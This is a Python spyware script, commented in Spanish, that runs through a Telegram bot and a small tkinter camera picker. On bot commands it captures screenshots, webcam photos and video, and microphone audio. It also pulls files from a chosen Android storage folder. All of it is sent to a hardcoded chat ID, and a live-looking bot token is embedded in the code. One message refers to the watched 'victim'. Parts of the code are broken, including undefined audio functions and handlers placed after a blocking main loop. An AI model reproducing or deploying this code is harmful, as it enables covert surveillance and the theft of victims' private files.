import cv2
import telebot
import pyautogui
import pyaudio
import wave
from moviepy.editor import VideoFileClip
import tkinter as tk
import os
# Token de tu bot de Telegram
TOKEN = '7362813759:AAEQrE7ypXGtFlv7QRXDaFlrlQux6tBOSBc'
# Chat ID específico donde se enviarán los mensajes y archivos
CHAT_ID = '6880663915'

# Inicializar el bot de Telegram
bot = telebot.TeleBot(TOKEN)

# Crear ventana tkinter
root = tk.Tk()
root.title("Seleccionar Cámara")

# Función para enviar mensajes de texto
def send_message(message):
    bot.send_message(CHAT_ID, message)

# Función para enviar fotos
def send_photo(photo):
    bot.send_photo(CHAT_ID, photo)

# Función para enviar video
def send_video(video):
    bot.send_video(CHAT_ID, video)

# Función para capturar pantalla
@bot.message_handler(commands=['captura'])
def capture_screen(message):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.jpeg')
    send_message("Captura de pantalla realizada:")
    send_photo(open('screenshot.jpeg', 'rb'))

# Función para grabar video
@bot.message_handler(commands=['video'])
def record_video(message):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
    
    while(cap.isOpened()):
        ret, frame = cap.read()
        if ret==True:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    
    video_clip = VideoFileClip('output.avi')
    video_clip.write_videofile('output.mp4')
    
    send_message("Video grabado:")
    send_video(open('output.mp4', 'rb'))

# Función para tomar foto
@bot.message_handler(commands=['foto'])
def take_photo(message):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite('photo.jpg', frame)
    
    cap.release()
    
    send_message("Foto tomada:")
    send_photo(open('photo.jpg', 'rb'))

# Función para grabar audio
@bot.message_handler(commands=['audio'])
def record_audio(message):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    RECORD_SECONDS = 5
    WAVE_OUTPUT_FILENAME = "output.wav"

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    send_message("Comenzando grabación de audio...")
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    send_message("Grabación de audio completa.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wave_file = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wave_file.setnchannels(CHANNELS)
    wave_file.setsampwidth(audio.get_sample_size(FORMAT))
    wave_file.setframerate(RATE)
    wave_file.writeframes(b''.join(frames))
    wave_file.close()

    send_message("Audio grabado.")
    send_message("Convirtiendo audio a formato MP3...")

    # Convertir el audio grabado a formato MP3
    audio_clip = AudioFileClip(WAVE_OUTPUT_FILENAME)
    audio_clip.write_audiofile('output.mp3', codec='libmp3lame')

    send_message("Audio convertido a formato MP3.")
    send_message("Enviando archivo de audio...")
    send_audio(open('output.mp3', 'rb'))

# Función para seleccionar cámara antes de grabar video
def select_camera_video(camera_index):
    cap = cv2.VideoCapture(camera_index)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
    
    while(cap.isOpened()):
        ret, frame = cap.read()
        if ret==True:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    
    video_clip = VideoFileClip('output.avi')
    video_clip.write_videofile('output.mp4')
    
    send_message("Video grabado:")
    send_video(open('output.mp4', 'rb'))

# Función para seleccionar cámara antes de tomar foto
def select_camera_photo(camera_index):
    cap = cv2.VideoCapture(camera_index)
    ret, frame = cap.read()
    cv2.imwrite('photo.jpg', frame)
    
    cap.release()
    
    send_message("Foto tomada:")
    send_photo(open('photo.jpg', 'rb'))

# Botones para seleccionar cámara antes de grabar video
btn_camera_front = tk.Button(root, text="Cámara Delantera para Video", command=lambda: select_camera_video(0))
btn_camera_front.pack()

btn_camera_back = tk.Button(root, text="Cámara Trasera para Video", command=lambda: select_camera_video(1))
btn_camera_back.pack()

# Botones para seleccionar cámara antes de tomar foto
btn_camera_front_photo = tk.Button(root, text="Cámara Delantera para Foto", command=lambda: select_camera_photo(0))
btn_camera_front_photo.pack()

btn_camera_back_photo = tk.Button(root, text="Cámara Trasera para Foto", command=lambda: select_camera_photo(1))
btn_camera_back_photo.pack()

# Iniciar la aplicación tkinter
root.mainloop()

# Función para extraer archivos, videos, fotos de una carpeta específica
@bot.message_handler(commands=['extraer'])
def extract_files(message):
    send_message("Está siendo vigilada la victima. Inserta el nombre de la carpeta para extraer archivos, videos, fotos:")

# Manejar el mensaje del usuario para obtener el nombre de la carpeta
@bot.message_handler(func=lambda message: True)
def handle_folder_name(message):
    folder_name = message.text
    folder_path = f'/storage/emulated/0/{folder_name}'
    
    if os.path.exists(folder_path):
        for file_name in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file_name)
            send_message(f"Enviando archivo: {file_name}")
            
            if file_name.endswith(('.jpg', '.jpeg', '.png')):
                send_photo(open(file_path, 'rb'))
            elif file_name.endswith(('.mp4', '.avi', '.pdf', '.docx', '.apk')):
                bot.send_document(CHAT_ID, open(file_path, 'rb'))
            else:
                send_message(f"Archivo: {file_name}")
                bot.send_document(CHAT_ID, open(file_path, 'rb'))
    else:
        send_message("La carpeta especificada no existe.")

# Iniciar el bot con el bucle de eventos
bot.infinity_polling()
